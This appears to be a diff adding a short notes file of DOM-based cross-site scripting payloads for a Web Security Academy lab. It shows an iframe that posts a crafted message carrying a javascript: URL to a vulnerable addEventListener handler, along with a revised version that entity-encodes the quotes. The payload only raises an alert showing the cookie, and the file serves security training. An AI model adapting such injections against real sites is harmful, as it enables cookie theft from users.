@@ -1,0 +1,7 @@
+// Payload created after examining vulnerable addEventListener()
+<iframe src="https://acf91f3e1ef5ebee80933540006d0079.web-security-academy.net/" onload="this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:alert(document.cookie)"}', '*')"></iframe>
+
+// Did not work due to the quotes.
+// Use HTML entities to represent the quotes
+<iframe src="https://acf91f3e1ef5ebee80933540006d0079.web-security-academy.net/" onload="this.contentWindow.postMessage('{&quot;type&quot;:&quot;load-channel&quot;,&quot;url&quot;:&quot;javascript:alert(document.cookie)&quot;}', '*')"></iframe>
+
